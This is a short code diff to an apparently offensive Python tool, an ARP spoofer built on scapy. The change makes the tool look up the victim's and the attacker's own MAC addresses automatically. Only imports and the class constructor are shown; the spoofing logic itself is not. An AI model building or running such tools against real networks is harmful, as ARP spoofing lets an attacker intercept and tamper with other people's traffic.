@@ -1,16 +1,16 @@
 from scapy.all import *
-
+from scapy.layers.l2 import getmacbyip
 import scapy.all as scapy
 import time
-import sys
+from getmac import get_mac_address as gma
 
 
 class ArpSpoofer:
-    def __init__(self,destinationMac, targetIP, gatewayIP, sourceMAC):
-        self.destinationMac = destinationMac #is Mac address of victim machine
+    def __init__(self,targetIP, gatewayIP):
+        self.destinationMac = getmacbyip(targetIP) #is Mac address of victim machine
         self.targetIP = targetIP #is Ip address of victim machine
         self.gatewayIP = gatewayIP #is gatewayIP
-        self.sourceMAC = sourceMAC
+        self.sourceMAC = gma()
 
     @staticmethod
     def get_mac(destinationIP, srcIP):
